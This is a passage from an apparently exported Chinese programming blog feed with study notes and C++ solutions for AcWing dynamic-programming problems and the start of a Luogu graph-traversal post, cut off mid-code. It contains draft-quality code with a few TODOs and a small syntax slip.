class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e3</span> + <span class="number">7</span>, mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i ++) &#123;</span><br><span class="line">        f[i][<span class="number">0</span>] = <span class="number">1</span>; <span class="comment">// 容量为0时，前 i 个物品全不选也是一种方案</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= n; j ++) &#123;</span><br><span class="line">            f[i][j] = f[i - <span class="number">1</span>][j] % mod; <span class="comment">// 特殊 f[0][0] = 1</span></span><br><span class="line">            <span class="keyword">if</span> (j &gt;= i) f[i][j] = (f[i - <span class="number">1</span>][j] + f[i][j - i]) % mod;    <span class="comment">//当可以塞入时，尝试塞入</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; f[n][n] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="AcWing-338-计数问题"><a href="#AcWing-338-计数问题" class="headerlink" title="AcWing 338. 计数问题"></a>AcWing 338. 计数问题</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240811202305644.png" alt="image-20240811202305644"></p><p>这题我感觉像是模拟+前缀和，分析xxxjyyy的各种情况</p><p><a href="https://www.acwing.com/solution/content/52109/">AcWing 338. 计数问题&lt;超短写法&gt; - AcWing</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (x)</span><br><span class="line">    res++, x /= <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>, dgt = <span class="built_in">get</span>(n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= dgt; ++j) &#123;</span><br><span class="line">    <span class="comment">// p为当前遍历位次数大小</span></span><br><span class="line">    <span class="comment">// l为第j位的左边的数</span></span><br><span class="line">    <span class="comment">// r为右边的数</span></span><br><span class="line">    <span class="comment">// dj为第j位上的数</span></span><br><span class="line">    <span class="type">int</span> p = <span class="built_in">pow</span>(<span class="number">10</span>, dgt - j);</span><br><span class="line">    <span class="type">int</span> l = n/p/<span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> r = n % p;</span><br><span class="line">    <span class="type">int</span> dj = n / p % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i)   res+=  l*p;         </span><br><span class="line">    <span class="keyword">else</span>    res+= (l - <span class="number">1</span>) * p;  <span class="comment">//去除00...0的情况</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == dj)     res += r + <span class="number">1</span>;      <span class="comment">//等于需小于等于r</span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; dj)             res += p;   <span class="comment">//小于可取全部值</span></span><br><span class="line">    <span class="comment">//大于则无</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a, b;</span><br><span class="line">  <span class="keyword">while</span> (cin &gt;&gt; a &gt;&gt; b, a) &#123; <span class="comment">// 输入处理，直到输入为0 0停止</span></span><br><span class="line">    <span class="keyword">if</span> (a &gt; b)</span><br><span class="line">      <span class="built_in">swap</span>(a, b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i)</span><br><span class="line">      cout &lt;&lt; <span class="built_in">count</span>(b, i) - <span class="built_in">count</span>(a - <span class="number">1</span>, i) &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="comment">//输出各位数字的个数</span></span><br><span class="line">    <span class="comment">//利用前缀和思想：[l,r]的和=s[r] - s[l - 1]</span></span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="状态压缩DP"><a href="#状态压缩DP" class="headerlink" title="状态压缩DP"></a>状态压缩DP</h3><h3 id="AcWing-291-蒙德里安的梦想"><a href="#AcWing-291-蒙德里安的梦想" class="headerlink" title="AcWing 291. 蒙德里安的梦想"></a>AcWing 291. 蒙德里安的梦想</h3><p><strong>摆放的小方格方案数 等价于 横着摆放的小方格方案数</strong></p><p>当我们确定唯一的横放小方格数量时，竖着放的小方格位置就已经确定了</p><ul><li>连续空着的列需要是偶数个</li><li>该位置未被其他横放小方块占据</li></ul><p>//TODO</p><h3 id="AcWing-91-最短Hamilton路径"><a href="#AcWing-91-最短Hamilton路径" class="headerlink" title="AcWing 91. 最短Hamilton路径"></a>AcWing 91. 最短Hamilton路径</h3><p><a href="https://www.acwing.com/solution/content/18533/">AcWing 91. 最短Hamilton路径(超详解) - AcWing</a></p><p>//TODO</p><p><code>f[i][j]=min(f[i][j],f[i-(1&lt;&lt;j)][k]+w[k][j])</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">20</span>, M = <span class="number">1</span> &lt;&lt; N;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f[M][N], w[N][N]; <span class="comment">// w表示的是无权图</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)         </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">      cin &gt;&gt; w[i][j];</span><br><span class="line">  <span class="built_in">memset</span>(f, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(f));       </span><br><span class="line">  f[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;      <span class="comment">//000.。。1    的状态，初始化为0</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i++)          <span class="comment">//枚举所有状态</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)     <span class="comment">//枚举所有点</span></span><br><span class="line">      <span class="keyword">if</span> (i &gt;&gt; j &amp; <span class="number">1</span>)       <span class="comment">//判断j位是否为1，为1</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)     <span class="comment">//k表示走到j这个点之前,以k为终点的最短距离</span></span><br><span class="line">          <span class="keyword">if</span> (i - (<span class="number">1</span> &lt;&lt; j) &gt;&gt; k &amp; <span class="number">1</span>)</span><br><span class="line">            f[i][j] = <span class="built_in">min</span>(f[i][j], f[i - (<span class="number">1</span> &lt;&lt; j)][k] + w[k][j]);</span><br><span class="line"></span><br><span class="line">  cout &lt;&lt; f[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>][n - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">  <span class="comment">// 11111111的情况   </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AcWing-285-没有上司的舞会"><a href="#AcWing-285-没有上司的舞会" class="headerlink" title="AcWing 285. 没有上司的舞会"></a>AcWing 285. 没有上司的舞会</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240811222520474.png" alt="image-20240811222520474"></p><p>我们可以设置一个节点的状态为选中或未选中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">6010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"><span class="type">int</span> happy[N];</span><br><span class="line"><span class="type">int</span> f[N][<span class="number">2</span>];</span><br><span class="line"><span class="type">bool</span> has_fa[N]; <span class="comment">//判断当前节点是否有父节点</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = b;</span><br><span class="line">    ne[idx] = h[a];</span><br><span class="line">    h[a] = idx ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    f[u][<span class="number">1</span>] = happy[u]; <span class="comment">//节点u的快乐值，不选节点u为0，全局变量设置</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = h[u]; ~i; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="built_in">dfs</span>(j);</span><br><span class="line">        f[u][<span class="number">1</span>] += f[j][<span class="number">0</span>];     <span class="comment">//选父节点则不选子节点</span></span><br><span class="line">        f[u][<span class="number">0</span>] += <span class="built_in">max</span>(f[j][<span class="number">0</span>], f[j][<span class="number">1</span>]);   <span class="comment">//不选父节点，则选择子节点的最大快乐值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;happy[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        <span class="built_in">add</span>(b, a);      <span class="comment">//反向建边，从根节点到叶子节点</span></span><br><span class="line">        has_fa[a] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> root = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(has_fa[root]) <span class="comment">//找到根节点</span></span><br><span class="line">        root ++;</span><br><span class="line">    <span class="built_in">dfs</span>(root);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">max</span>(f[root][<span class="number">0</span>], f[root][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="AcWing-901-滑雪"><a href="#AcWing-901-滑雪" class="headerlink" title="AcWing 901. 滑雪"></a>AcWing 901. 滑雪</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240811222619650.png" alt="image-20240811222619650"></p><p><code>f[i][j]</code>表示从该点出发可以达到的最大位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">310</span>;</span><br><span class="line"><span class="type">int</span> n,m; </span><br><span class="line"><span class="type">int</span> f[N][N]; </span><br><span class="line"><span class="type">int</span> h[N][N];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> &amp;v = f[x][y];</span><br><span class="line">      <span class="keyword">if</span>(v != <span class="number">-1</span>) <span class="keyword">return</span> v; </span><br><span class="line">        v = <span class="number">1</span>; <span class="comment">//注意v要先赋值为1哦~</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i ++)&#123; <span class="comment">//四个方向</span></span><br><span class="line">        <span class="type">int</span> xx = x + dx[i];</span><br><span class="line">        <span class="type">int</span> yy = y + dy[i];</span><br><span class="line">        <span class="keyword">if</span>(xx &gt;= <span class="number">1</span> &amp;&amp; xx &lt;= n &amp;&amp; yy &gt;= <span class="number">1</span> &amp;&amp; yy &lt;= m &amp;&amp; h[x][y] &gt; h[xx][yy])&#123; <span class="comment">//判断这点是否能走</span></span><br><span class="line">            v = <span class="built_in">max</span>(v,<span class="built_in">dp</span>(xx,yy) + <span class="number">1</span>); <span class="comment">//更新</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j &lt;= m;j ++)&#123;</span><br><span class="line">            cin&gt;&gt;h[i][j]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">-1</span>,<span class="keyword">sizeof</span> f);  <span class="comment">//初始化</span></span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j &lt;= m;j ++)&#123;</span><br><span class="line">           </span><br><span class="line">            res = <span class="built_in">max</span>(res,<span class="built_in">dp</span>(i,j)); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷题单——图的基本应用</title>
      <link href="/2024/05/15/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E5%9B%BE%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%BA%94%E7%94%A8/"/>
      <url>/2024/05/15/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E5%9B%BE%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="P5318-【深基18-例3】查找文献"><a href="#P5318-【深基18-例3】查找文献" class="headerlink" title="P5318 【深基18.例3】查找文献"></a>P5318 【深基18.例3】查找文献</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240708152213161.png" alt="image-20240708152213161"></p><p>这题是分别进行DFS和BFS遍历，要求有多个节点时，按照从小到大进行排序。由于采用的是yxc的<code>链式前向星</code>存储，涉及到多个数组，不知道该如何在输入后立即进行排序。因此第一次我多次在遍历过程中使用<code>set</code>来进行排序。功能正确但是会超时。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> st[N]; <span class="comment">// 标记数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  e[idx] = b; <span class="comment">// 添加边 b</span></span><br><span class="line">  ne[idx] = h[a];</span><br><span class="line">  h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">  set&lt;<span class="type">int</span>&gt; set_save; <span class="comment">// 每次递归调用时使用一个新的 set</span></span><br><span class="line">  st[u] = <span class="literal">true</span>;</span><br><span class="line">  cout &lt;&lt; u &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">    <span class="type">int</span> j = e[i];</span><br><span class="line">    <span class="keyword">if</span> (!st[j]) &#123;</span><br><span class="line">      set_save.<span class="built_in">insert</span>(j);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> j : set_save) &#123;</span><br><span class="line">    <span class="built_in">dfs</span>(j);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">  priority_queue&lt;<span class="type">int</span>&gt; que;</span><br><span class="line">  que.<span class="built_in">push</span>(u);</span><br><span class="line">  st[u] = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">    <span class="type">int</span> t = que.<span class="built_in">top</span>();</span><br><span class="line">    que.<span class="built_in">pop</span>();</span><br><span class="line">    cout &lt;&lt; t &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">      <span class="type">int</span> j = e[i];</span><br><span class="line">      <span class="keyword">if</span> (!st[j]) &#123;</span><br><span class="line">        st[j] = <span class="literal">true</span>;</span><br><span class="line">        que.<span class="built_in">push</span>(j);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a, b;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="built_in">sizeof</span>(h));</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="built_in">add</span>(a, b);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(st, <span class="number">0</span>, <span class="built_in">sizeof</span>(st));</span><br><span class="line"></span><br><span 